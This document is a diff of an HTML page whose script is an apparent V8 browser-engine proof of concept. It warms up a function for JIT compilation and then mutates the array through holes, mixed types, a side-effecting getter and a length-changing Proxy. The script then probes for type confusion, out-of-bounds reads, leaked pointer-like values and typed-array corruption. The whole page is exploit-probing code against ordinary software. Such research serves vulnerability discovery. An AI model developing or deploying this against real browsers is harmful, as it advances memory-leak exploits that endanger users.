@@ -1,6 +1,6 @@
 <!doctype html>
 <meta charset="utf-8">
-<title>V8 Leak Controlled Chaos</title>
+<title>V8 Final PoC - JIT Instability / Leak Probe</title>
 
 <pre id="log"></pre>
 <script>
@@ -9,35 +9,44 @@ const log = m => {
   console.log(m);
 };
 
+// =======================
+// TARGET
+// =======================
 function vuln(a,i){ return a[i] + 1.1; }
 
-// ===== WARMUP =====
+// =======================
+// WARMUP (JIT trigger)
+// =======================
 function warmup(){
   let arr = Array.from({length:30}, (_,i)=>i+0.5);
-  for(let i=0;i<80000;i++){
+  for(let i=0;i<60000;i++){
     vuln(arr, i % 30);
   }
   return arr;
 }
 
-// ===== MUTATE =====
+// =======================
+// MUTATION (controlled chaos)
+// =======================
 function mutate(arr){
   // holes
-  for(let i=0;i<5;i++) delete arr[i];
+  delete arr[0];
+  delete arr[1];
+  delete arr[2];
 
-  // shrink & expand
+  // shrink + extend
   arr.length = 10;
   arr[60] = 13.37;
 
   // mix types
   arr[2] = {x:1};
 
-  // getter with controlled side effect
-  let counter = 0;
+  // getter side-effect (limited)
+  let hit = 0;
   Object.defineProperty(arr,3,{
     get(){
-      if(counter++ < 3){
-        arr.push(99.99 + counter);
+      if(hit++ < 2){
+        arr.push(99.99 + hit);
       }
       return 1.1;
     }
@@ -46,13 +55,15 @@ function mutate(arr){
   return arr;
 }
 
-// ===== PROXY =====
+// =======================
+// PROXY (break assumption)
+// =======================
 function breakAssumption(a){
   let toggle = 0;
   return new Proxy(a,{
     get(t,p){
-      if(p==="length"){
-        if(toggle++ % 2 === 0){
+      if(p === "length"){
+        if((toggle++ % 2) === 0){
           t.push(77.77);
         }
       }
@@ -61,16 +72,20 @@ function breakAssumption(a){
   });
 }
 
-// ===== TYPED ARRAY =====
+// =======================
+// TYPED ARRAY (detect corruption)
+// =======================
 let buf = new ArrayBuffer(0x4000);
 let f64 = new Float64Array(buf);
 
-// baseline
+// baseline pattern
 for(let i=0;i<f64.length;i++){
   f64[i] = 0x41414141 + i;
 }
 
-// ===== MAIN =====
+// =======================
+// MAIN
+// =======================
 function run(){
   log("[*] warmup");
   let base = warmup();
@@ -81,35 +96,56 @@ function run(){
   arr = mutate(arr);
   arr = breakAssumption(arr);
 
-  // multiple trigger
+  // === RAW VALUE CHECK ===
+  let raw = arr[10];
+  log("[RAW] arr[10] = " + raw);
+  log("[TYPE] " + typeof raw);
+
+  // === JIT CALL ===
   let r1 = vuln(arr,3);
   let r2 = vuln(arr,10);
   let r3 = vuln(arr,60);
 
-  log("r1="+r1);
-  log("r2="+r2);
-  log("r3="+r3);
+  log("r1=" + r1);
+  log("r2=" + r2);
+  log("r3=" + r3);
 
-  // ===== OOB CHECK =====
-  for(let i=0;i<50;i++){
+  // =======================
+  // NaN DETECTION (key signal)
+  // =======================
+  if(Number.isNaN(r2)){
+    log("[!] NaN detected → possible JIT confusion");
+
+    // scan around area
+    for(let i=5;i<25;i++){
+      log("[SCAN] arr["+i+"] = " + arr[i]);
+    }
+  }
+
+  // =======================
+  // OOB READ CHECK
+  // =======================
+  for(let i=0;i<40;i++){
     let idx = arr.length + i;
     let v = arr[idx];
 
     if(v !== undefined){
-      log("[OOB] "+idx+" = "+v);
+      log("[OOB] idx="+idx+" val="+v);
     }
 
     if(typeof v === "number" && Math.abs(v) > 1e12){
-      log("[PTR] "+v);
+      log("[PTR-LIKE] "+v);
     }
   }
 
-  // ===== MEMORY DIFF =====
-  for(let i=0;i<100;i++){
+  // =======================
+  // TYPED ARRAY CORRUPTION CHECK
+  // =======================
+  for(let i=0;i<80;i++){
     let v = f64[i];
 
     if(v !== 0x41414141 + i){
-      log("[CORRUPTION] "+i+" = "+v);
+      log("[CORRUPTION] idx="+i+" val="+v);
     }
   }
 
